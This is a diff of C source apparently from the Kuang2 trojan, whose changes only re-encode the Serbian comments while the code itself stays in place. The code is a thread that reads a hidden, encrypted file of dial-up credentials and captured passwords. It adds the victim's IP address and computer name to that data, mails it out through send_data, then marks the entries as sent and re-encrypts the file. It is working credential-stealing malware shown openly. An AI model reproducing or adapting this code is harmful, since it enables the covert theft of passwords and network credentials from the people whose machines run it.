@@ -1,7 +1,7 @@
 /***[ThuNderSoft]*************************************************************
 								 KUANG2: thread
 								   ver: 0.15
-								úùÄÍ WEIRD ÍÄùú
+								     WEIRD
 *****************************************************************************/
 
 /* HISTORY */
@@ -34,8 +34,8 @@ char newtag[]="-----\r\n";
 /*
 	SendThread
 	----------
-  ş thread koji „alje sve podatke: i dun i pass
-  ş u buff (len <= 5KB) se nalazi novi dun string. */
+  + thread koji Å¡alje sve podatke: i dun i pass
+  + u buff (len <= 5KB) se nalazi novi dun string. */
 
 DWORD WINAPI SendThread (LPVOID param)
 {
@@ -50,60 +50,60 @@ DWORD WINAPI SendThread (LPVOID param)
 //if (SENDpassOK) MsgBox("passOK"); else MsgBox("passNOT");
 
 /*** DUN PODACI ***/
-// proverava se da li novi zapis ve† postoji!
+// proverava se da li novi zapis veÄ‡ postoji!
 
-	if (SENDdunOK) goto onlypass;		// ako su u trenutnom ukljuenju na internet dun podaci ve† poslati, idi dalje
+	if (SENDdunOK) goto onlypass;		// ako su u trenutnom ukljuÄenju na internet dun podaci veÄ‡ poslati, idi dalje
 
 	// otvori fajl
 	hfajl=CreateFile(sysfile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
-	if (hfajl==INVALID_HANDLE_VALUE) goto kraj1;		// ne„to nije u redu
+	if (hfajl==INVALID_HANDLE_VALUE) goto kraj1;		// neÅ¡to nije u redu
 
-	// alociraj memoriju veliine fajla + veliine bafera
+	// alociraj memoriju veliÄine fajla + veliÄine bafera
 	fsize=GetFileSize(hfajl, NULL);
 	fbafer=(char *)GlobalAlloc (GMEM_FIXED | GMEM_ZEROINIT, fsize+strlengthF(buff)+5124);
 	if (fbafer==NULL) goto kraj2;		// alloc error
 
-	if (fsize)	{						// ako sadr‚aj fajla postoji
-		ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// onda ga uitaj
+	if (fsize)	{						// ako sadrÅ¾aj fajla postoji
+		ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// onda ga uÄitaj
 		strdecrypt(fbafer, KUANG_SEED);						// i dekriptuj
 	}
 
 	novizapis=FALSE;	// nema novog zapisa
 
-	// ako je buf prazan, „to se de„ava kad se korisnik alternativno loguje
-	// na net onda upi„i u bafer neki string da ne bi kuang2 stalno registrovao ovakvo logovanje
+	// ako je buf prazan, Å¡to se deÅ¡ava kad se korisnik alternativno loguje
+	// na net onda upiÅ¡i u bafer neki string da ne bi kuang2 stalno registrovao ovakvo logovanje
 	if (!buff[0]) strcopyF(buff, "alternate\r\n");
 
 	if (!strfind(fbafer, buff)) {	// u 'buff' su podaci o trenutnom logovanju
-		novizapis=TRUE;				// nije na„ao je podatke, znai novi su
+		novizapis=TRUE;				// nije naÅ¡ao je podatke, znaÄi novi su
 		straddF(fbafer, buff);		// dodaj ih u fajl bafer
 	}
 
 	rasnovizapis = WriteRasData(fbafer);	// dodaj i sve ostale passworde
 	novizapis |= rasnovizapis;
 
-	if (!novizapis) {		// ako je ve† sve bilo iza”i, tj nema ni„ta novo
+	if (!novizapis) {		// ako je veÄ‡ sve bilo izaÄ‘i, tj nema niÅ¡ta novo
 		SENDdunOK=TRUE;		// sve je bilo ok
 		goto kraj3;
 	}
 
-	// nije na„ao podatke, „alji nove...
+	// nije naÅ¡ao podatke, Å¡alji nove...
 	j=strlengthF(buff);
-	straddFaddd(buff, tempIP, 0x0A0D);		// dodaj trenutni IP samo na ono „to se „alje
-	straddFaddd(buff, compname, 0x0A0D);	// dodaj ComputerName samo na ono „to se „alje
+	straddFaddd(buff, tempIP, 0x0A0D);		// dodaj trenutni IP samo na ono Å¡to se Å¡alje
+	straddFaddd(buff, compname, 0x0A0D);	// dodaj ComputerName samo na ono Å¡to se Å¡alje
 
 #define		notsendOK		fsize
 //MsgBox(buff);
-	// po„alji!
+	// poÅ¡alji!
 	notsendOK=send_data(buff);				// slanje bafera na mail
 	buff[j]=0;
 
 //if (notsendOK) MsgBox("dun NIJE POSLATO!");
 //else MsgBox("dun POSLATO!");
 
-	if (!notsendOK) {					// ako je sve pro„lo OK idi snimi
+	if (!notsendOK) {					// ako je sve proÅ¡lo OK idi snimi
 		strcrypt(fbafer, KUANG_SEED);	// kriptovanje celog bafera
-		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na poetak fajla
+		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na poÄetak fajla
 		WriteFile(hfajl, fbafer, strlengthF(fbafer)+1, &procitano, NULL); // snimi + snimi zadnju 0
 		SENDdunOK=TRUE;
 	}
@@ -120,53 +120,53 @@ kraj1:
 
 
 /*** PASS PODACI ***/
-// Oni se „alju uvek kada postoji novi zapis.
-// Ne proverava se da li novi zapis ve† postoji!
+// Oni se Å¡alju uvek kada postoji novi zapis.
+// Ne proverava se da li novi zapis veÄ‡ postoji!
 
 onlypass:
-	if (SENDpassOK) goto exit1; // ako su u trenutnom ukljuenju na internet pass podaci ve† poslati, iza”i
+	if (SENDpassOK) goto exit1; // ako su u trenutnom ukljuÄenju na internet pass podaci veÄ‡ poslati, izaÄ‘i
 
 	// otvori fajl
 	hfajl=CreateFile(dl_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
-	if (hfajl==INVALID_HANDLE_VALUE) goto exit1;		// ne„to nije u redu ili fajl jo„ ne postoji
+	if (hfajl==INVALID_HANDLE_VALUE) goto exit1;		// neÅ¡to nije u redu ili fajl joÅ¡ ne postoji
 	fsize=GetFileSize(hfajl, NULL);
-	if (!fsize) goto exit2;			// ako je veliina fajla 0??? iza”i
+	if (!fsize) goto exit2;			// ako je veliÄina fajla 0??? izaÄ‘i
 
-	// alociraj memoriju veliine bafera i malko vi„e
+	// alociraj memoriju veliÄine bafera i malko viÅ¡e
 	fbafer=(char *)GlobalAlloc (GMEM_FIXED | GMEM_ZEROINIT, fsize+20);
 	if (fbafer==NULL) goto exit2;	// alloc error
 
-	ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// uitaj ga
+	ReadFile(hfajl, fbafer, fsize, &procitano, NULL);	// uÄitaj ga
 	fbafer[fsize]=0;				// zatvori string
 	strdecryptS(fbafer);			// i dekriptuj
 
-	k=strfind(fbafer, newtag);	// na”i novi tag
+	k=strfind(fbafer, newtag);	// naÄ‘i novi tag
 	if (!k) {
-		SENDpassOK=TRUE;		// k==0, znai nije ga na„ao, iza”i
-		goto exit3;				// k<>0, zani na„ao ga je, sada fbafer[i]==newtag;
+		SENDpassOK=TRUE;		// k==0, znaÄi nije ga naÅ¡ao, izaÄ‘i
+		goto exit3;				// k<>0, znaÄi naÅ¡ao ga je, sada fbafer[i]==newtag;
 	}
 	i=k-1;
 
 
-	// dodaj samo jo„ ComputerName na kraj zapisa!
+	// dodaj samo joÅ¡ ComputerName na kraj zapisa!
 	j=strlengthF(fbafer);
 	straddF(fbafer, "# ");
 	straddF(fbafer, compname);			// dodaj ComputerName
 //MsgBox(&fbafer[i]);
 	notsendOK=send_data(&fbafer[i]);	// slanje bafera na mail
-	fbafer[j]=0;						// izbri„i ComputerName
+	fbafer[j]=0;						// izbriÅ¡i ComputerName
 
 //if (notsendOK) MsgBox("pass NIJE POSLATO!");
 //else MsgBox("pass POSLATO!");
 
-	if (!notsendOK) {					// ako je sve pro„lo OK idi snimi
+	if (!notsendOK) {					// ako je sve proÅ¡lo OK idi snimi
 		while (k) {							// promeni sve tagove!
-			fbafer[i]=0x2B;					// promeni tag da se oznai da je poslato
-			k=strfind(&fbafer[i], newtag);	// na”i slede†i tag
+			fbafer[i]=0x2B;					// promeni tag da se oznaÄi da je poslato
+			k=strfind(&fbafer[i], newtag);	// naÄ‘i sledeÄ‡i tag
 			i+=(k-1);
 		}
 		strcryptS(fbafer);					// kriptovanje celog bafera
-		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na poetak fajla
+		SetFilePointer(hfajl, 0, NULL, FILE_BEGIN); // idi na poÄetak fajla
 		WriteFile(hfajl, fbafer, strlengthF(fbafer), &procitano, NULL); // snimi (bez poslednje 0)
 		SENDpassOK=TRUE;
 	}
@@ -178,15 +178,15 @@ exit2:
 exit1:
 
 	if (SENDdunOK) {
-		buff[0]=0;		// obri„i buf
+		buff[0]=0;		// obriÅ¡i buf
 		if (SENDpassOK) {				// ako su poslati svi podaci
-			strcopyF(lastIP, tempIP);	// zapamti trenutni IP da ne bi slede†i put sve proveravali ponovo
+			strcopyF(lastIP, tempIP);	// zapamti trenutni IP da ne bi sledeÄ‡i put sve proveravali ponovo
 		}
 	}
 
 //	if (SENDdunOK) MsgBox("dunOK"); else MsgBox("dunNOT");
 //	if (SENDpassOK) MsgBox("passOK"); else MsgBox("passNOT");
 
-	unutra=FALSE;					// nismo vi„e unutar thread-a
+	unutra=FALSE;					// nismo viÅ¡e unutar thread-a
 	return 0;
 }
